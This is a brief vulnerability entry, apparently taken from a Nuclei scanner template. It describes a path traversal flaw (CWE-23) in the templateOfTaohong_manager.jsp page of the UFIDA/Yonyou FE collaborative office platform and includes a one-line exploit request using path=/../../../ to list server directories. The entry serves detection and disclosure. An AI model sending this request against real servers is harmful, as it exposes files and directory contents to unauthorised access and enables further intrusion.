# Vulnerability: FE collaborative Office templateOfTaohong_manager.jsp - Path Traversal
**Classification:** CWE-23
**Source:** Nuclei Template (`yonyou-fe-directory-traversal.yaml`)

## Description
There is a directory traversal vulnerability in the templateOfTaohong_manager.jsp file of UFIDA FE collaborative office platform. Through the vulnerability, attackers can obtain directory files and other information, leading to further attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
```

